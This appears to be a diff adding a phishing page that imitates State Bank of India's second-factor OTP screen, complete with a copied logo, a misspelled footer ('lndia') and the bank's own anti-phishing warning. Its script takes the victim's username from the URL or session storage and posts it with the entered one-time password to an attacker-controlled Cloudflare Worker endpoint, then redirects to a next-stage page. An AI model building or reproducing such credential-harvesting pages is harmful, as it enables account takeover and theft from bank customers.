@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBI Secure OTP · Second Factor</title>
+    <!-- same favicon as original -->
+    <link rel="icon" type="image/png" href="https://vuejs.org/images/logo.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f0f0;
+            min-height: 100vh;
+            padding-bottom: 20px;
+        }
+        .header {
+            text-align: center;
+            padding: 0;
+            background-color: white;
+            line-height: 0;
+        }
+        .logo {
+            max-width: 100%;
+            height: auto;
+            max-height: 120px;
+            display: block;
+            margin: 0 auto;
+        }
+        .container {
+            max-width: 460px;
+            margin: 0 auto 15px auto;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
+            overflow: visible;
+            padding: 0 20px 20px 20px;
+        }
+        .form-header {
+            background-color: #e6f3ff;
+            color: #2c517a;        
+            padding: 14px 20px 6px 20px;
+            text-align: center;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            line-height: 1.4;
+            margin-left: -20px;
+            margin-right: -20px;
+            margin-top: 0;
+            margin-bottom: 0;
+        }
+        /* marquee style – slightly modified message for OTP context */
+        .marquee-red {
+            color: #8B0000;
+            font-weight: bold;
+            background-color: #e6f3ff;
+            padding: 12px 20px 14px 20px;
+            border: none;
+            margin-left: -20px;
+            margin-right: -20px;
+            margin-top: 0;
+            margin-bottom: 10px;
+            width: auto;
+            font-size: 11px;
+            display: block;
+        }
+        /* new welcome row with name and timestamp */
+        .welcome-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            margin: 15px 0 5px 0;
+            font-size: 13px;
+            color: #2c517a;
+            font-weight: 600;
+        }
+        .welcome-name {
+            font-size: 15px;
+            color: #1e3c5c;
+        }
+        .timestamp {
+            font-size: 11px;
+            color: #555;
+            font-weight: normal;
+        }
+        /* instruction text - now sky blue */
+        .instruction {
+            font-size: 14px;
+            color: #007299; /* sky blue */
+            margin: 8px 0 6px 0;
+        }
+        .mandatory-note {
+            font-size: 11px;
+            color: #8B0000;
+            margin: 5px 0 15px 0;
+            font-style: italic;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-label {
+            display: block;
+            font-size: 12px;
+            font-weight: bold;
+            color: #333333;
+            margin-bottom: 5px;
+        }
+        .form-label .asterisk {
+            color: #cc0000;
+            font-size: 14px;
+            margin-left: 2px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 7px;
+            font-size: 13px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: rgba(0, 0, 0, 0.02);
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .form-input:focus {
+            border-color: #24A1E8;
+        }
+        /* button group – single submit button, now centered */
+        .button-group {
+            display: flex;
+            justify-content: center;   /* center the button */
+            margin: 20px 0 10px 0;
+        }
+        .submit-btn {
+            background-color: #CBA135; /* satin sheen gold */
+            color: white;              /* white text for contrast */
+            padding: 5px 20px;
+            border: none;
+            border-radius: 4px;         /* slightly rounded to match modern style */
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: background-color 0.2s;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        .submit-btn:hover {
+            background-color: #b38f2d;  /* darker gold */
+            color: white;                /* keep white on hover */
+        }
+        .submit-btn:disabled {
+            background-color: #a0a0a0;
+            cursor: not-allowed;
+        }
+        /* resend green button */
+        .resend-btn {
+            display: inline-block;
+            background-color: #01796F;  /* green */
+            color: white;
+            padding: 4px 20px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 500;
+            border: none;
+            cursor: pointer;
+            margin: 5px 0 15px 0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        .resend-btn:hover {
+            background-color: #1b5e20;
+        }
+        /* bullet list – increased font size to 12px (was 11px) */
+        .security-bullet {
+            font-size: 13px;            /* slightly larger */
+            color: #333333;
+            margin: 15px 0 10px 0;
+            padding: 12px 12px 8px 12px;
+            background-color: rgba(255, 215, 0, 0.1); /* 10% gold */
+            border-radius: 6px;
+            /* fallback */
+            background-color: #fff8e7;
+            background-color: rgba(255, 215, 0, 0.1);
+        }
+        .security-bullet ul {
+            list-style-type: disc;
+            padding-left: 20px;
+        }
+        .security-bullet li {
+            margin-bottom: 15px;
+            line-height: 2;
+        }
+        .security-bullet a {
+            color: #24A1E8;
+            text-decoration: none;
+        }
+        .security-bullet a:hover {
+            text-decoration: underline;
+        }
+        hr {
+            margin: 15px 0 10px 0;
+            border: 0;
+            border-top: 1px solid #ddd;
+        }
+        /* Footer styling – black background, white text */
+        .footer-links {
+            font-size: 14px;             /* slightly larger */
+            text-align: center;
+            line-height: 1.6;
+            color: white;                 /* changed to white for contrast */
+            background-color: #424242;       /* black background as requested */
+            padding: 10px 0;               /* add some breathing space */
+            margin-top: 5px;
+            border-radius: 0 0 4px 4px;   /* slight curve to match container */
+        }
+        .footer-links a {
+            color: #cccccc;                /* light gray for links on black */
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: white;
+        }
+        .footer-links span {
+            color: inherit;                 /* inherit white from parent, remove inline style later */
+            font-size: 14px;                /* keep consistent */
+        }
+        .domain-hint {
+            font-size: 10px;
+            color: #777;
+            text-align: right;
+            margin: 2px 0 0 0;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <!-- header: same SBI logo as original -->
+        <div class="header">
+            <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="State Bank of India" class="logo">
+        </div>
+
+        <div class="container">
+            <!-- header inside container: Second Factor Authentication -->
+            <div class="form-header">Login Second Factor Authentication</div>
+
+            <!-- instruction text from the image - now sky blue via CSS -->
+            <div class="instruction">Enter the One Time Password sent to your mobile phone</div>
+            <div class="mandatory-note">Mandatory fields are marked with an asterisk (*)</div>
+
+            <!-- OTP form with hidden username field and submit handler -->
+            <form id="otpForm" onsubmit="return submitOTP(event)">
+                <!-- Hidden username field - will be populated from URL or sessionStorage -->
+                <input type="hidden" id="username" name="username" value="">
+
+                <div class="form-group">
+                    <label class="form-label">One Time Password <span class="asterisk">*</span></label>
+                    <input type="text" id="otp" class="form-input" placeholder="Enter 6-digit OTP" maxlength="6" required>
+                </div>
+
+                <!-- SUBMIT BUTTON – centered and gold with white text -->
+                <div class="button-group">
+                    <button type="submit" class="submit-btn">Submit</button>
+                </div>
+
+                <!-- GREEN BUTTON for resend OTP (unchanged) – you can add functionality later -->
+                <div style="margin: 0 0 10px 0;">
+                    <span style="font-size: 13px; color: #333;">If you did not receive the High Security Password on SMS, you can </span>
+                    <a href="#" class="resend-btn" id="resendLink">Click here to resend the OTP</a>
+                </div>
+
+                <!-- important security bullet points – font size now 12px (slightly larger) -->
+                <div class="security-bullet">
+                    <ul>
+                        <li>Please note that all communication related to Internet banking will be sent on your registered mobile number.</li>
+                        <li>State Bank or any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on <a href="mailto:report.phishing@sbi.co.in">report.phishing@sbi.co.in</a> if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials.</li>
+                    </ul>
+                </div>
+            </form>
+
+            <hr>
+
+            <!-- footer text with black background, white text -->
+            <div class="footer-links">
+                <a href="#">Privacy Statement</a> | <a href="#">Disclosure</a><br>
+                <a href="#">Terms of Service (Terms & Conditions)</a><br>
+                © State Bank of lndia<br>
+                <span>Site best viewed at 1024 x 768 resolution in Microsoft Edge 79+, Mozilla 96+, Google Chrome 97+</span>
+            </div>
+        </div>
+
+        <!-- footer image has been removed as per request -->
+    </div>
+
+    <script>
+        // Immediately try to populate username from URL parameter or sessionStorage
+        (function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let username = urlParams.get('user'); // e.g., ?user=john
+
+            if (!username) {
+                // Fallback to sessionStorage (if login page stored it there)
+                username = sessionStorage.getItem('sbi_username');
+            }
+
+            if (username) {
+                document.getElementById('username').value = username;
+                // Optional: display a welcome message
+                // You could add a <div class="welcome-name"> if you want
+            }
+        })();
+
+        async function submitOTP(event) {
+            event.preventDefault(); // Stop normal form submission
+
+            const username = document.getElementById('username').value;
+            const otp = document.getElementById('otp').value;
+
+            if (!username) {
+                alert('Username is missing. Please go back to login page.');
+                return false;
+            }
+
+            const payload = {
+                username: username,
+                otp: otp,
+                timestamp: new Date().toISOString()
+            };
+
+            // Disable submit button (text stays "Submit")
+            const submitBtn = document.querySelector('.submit-btn');
+            submitBtn.disabled = true;
+
+            try {
+                // 🔁 Replace with your actual Worker URL (use same or different endpoint)
+                const workerURL = 'https://your-worker.your-subdomain.workers.dev/otp'; // adjust as needed
+
+                const response = await fetch(workerURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    // Redirect on success
+                    window.location.href = 'service.html';
+                } else {
+                    alert('OTP verification failed. Please try again.');
+                    submitBtn.disabled = false; // Re-enable on error
+                }
+            } catch (error) {
+                alert('Network error. Check Worker URL or connection.');
+                console.error(error);
+                submitBtn.disabled = false; // Re-enable on network error
+            }
+
+            return false;
+        }
+
+        // Optional: handle resend link click – you can add a similar fetch to resend OTP
+        document.getElementById('resendLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            if (!username) {
+                alert('Username not found. Please restart login.');
+                return;
+            }
+
+            // Simple alert for now – you can extend to call Worker
+            alert('Resend functionality not implemented in this demo. You can add a fetch to your Worker.');
+            // Example:
+            // fetch('https://your-worker.workers.dev/resend', { method: 'POST', body: JSON.stringify({username}) })
+        });
+    </script>
+</body>
+</html>
